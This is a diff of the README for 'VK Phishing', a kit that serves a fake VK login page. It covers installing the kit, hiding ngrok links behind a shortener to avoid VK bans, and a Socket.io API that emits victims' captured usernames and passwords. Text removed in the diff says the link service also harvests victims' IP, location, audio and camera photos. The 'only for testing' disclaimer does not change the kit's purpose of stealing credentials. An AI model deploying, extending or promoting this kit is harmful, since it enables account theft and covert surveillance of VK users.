@@ -1,20 +1,20 @@
 # VK Phishing
 
-This tool is ONLY FOR testing. Author is not responsible for all stolen accounts by this tools.
+This tool is ONLY FOR testing. Author is not responsible for anything you do with this tool.
 
 ## Installation
 
-0. Install [node js and npm](https://nodejs.org/en/download/) if not installed yet
+Install [node js and npm](https://nodejs.org/en/download/) if not installed yet
 
 1. Go to [Releases](https://github.com/xxhax-team/vk-phishing/releases)
 
-1. Download the latest
+2. Download the latest
 
-1. Unzip it into the folder
+3. Unzip it into the folder
 
-1. Open this folder in terminal/cmd
+4. Open this folder in terminal/cmd
 
-1. Execute following commands in the terminal:
+5. Execute following commands in the terminal:
 
 ```bash
 # Install dependencies and make build
@@ -32,21 +32,11 @@ npm start
 ℹ Shorten url is: https://vk.cc/bRuH
 ```
 
-#### DO NOT DISTRIBUTE PUBLIC URL IN VK
+#### DO NOT SHARE PUBLIC URL IN VK
 
 You may get banned. Use shorten URL instead
 
 ## Configuration
-
-### Login Page [ _DEPRECATED_ since 1.3 ]
-
-Configuration is stored in `nuxt.config.js`, as the option `vkLogin`. Options (all required):
-
-- `appName` - VK application name
-
-* `appLogo` - VK application logo, must be square, recommended size is (50x50)
-
-- `cancelReturnUrl` - URL, to what user will be redirected, if press cancel button
 
 ### Ngrok
 
@@ -56,9 +46,10 @@ Read more at [ngrok docs](https://ngrok.com/docs#config)
 
 ### Aye Kosmonavt
 
-Read his docs [on github](https://github.com/AlexXanderGrib/aye-kosmonavt-api#readme)
+Read his docs [on github](https://github.com/xxhax-team/aye-kosmonavt-api#readme)
 
-Here it used for hide ngrok links, what often are banned by VK. Also aye-kosmonavt leaks user data, such as ip, port, user-agent, navigator settings, and can leak location, audio (3 sec) and frontal camera photo.
+Here it used for hide ngrok links, what often are banned by VK.
+For more info join Aye Kosmonavt Telegram [@xxhaxteam_ayekosmonavt_leaks](https://t.me/xxhaxteam_ayekosmonavt_leaks)
 
 Config stored in `config/aye-kosmonavt.yml`. You can create multiple presets for you convenience and select it by `use` option.
 
@@ -82,19 +73,24 @@ Options used in config:
 
 ## WebSocket API (based on Socket.io)
 
-Events: 
+Events:
 
 1. `user_auth_attempt`
-Event is called on every login attempt
+   Event is called on every login attempt
+
 ```ts
 type UserAuthAttemptEvent = {
-  status: number; // this is auth status constant*
-  username: string;
-  password: string;
+  status: number // this is auth status constant*
+  username: string
+  password: string
 }
 ```
+
+\*See auth status constant in `server/auth-constants.js`
+
 2. `user_successful_auth`
-Event is called when users logins successful
+   Event is called when users logins successful
+
 ```ts
 type UserSuccessfulAuthEvent = {
   first_name: string;
@@ -104,22 +100,30 @@ type UserSuccessfulAuthEvent = {
 ```
 
 3. `ngrok_connected`
-Event is called when ngork is connected
+   Event is called when ngork is connected
+
 ```ts
 type NgrokConnectedEvent = {
-  publicUrl: string;
-  shortUrl: string;
-} 
+  publicUrl: string
+  shortUrl: string
+}
 ```
+
 Public & Short urls received form [aye-kosmonavt-api](https://npmjs.org/package/aye-kosmonavt-api)
 
 4. `ngrok_fail_start`
-Event is called if ngrok fails start
+   Event is called if ngrok fails start
+
 ```ts
 type NgrokFailStartEvent = Error
 ```
 
 ## Change log
+
+**1.5.2**
+
+- Updated VK verification checkmark
+- Fixed some shit in docs
 
 **1.5.0**
 
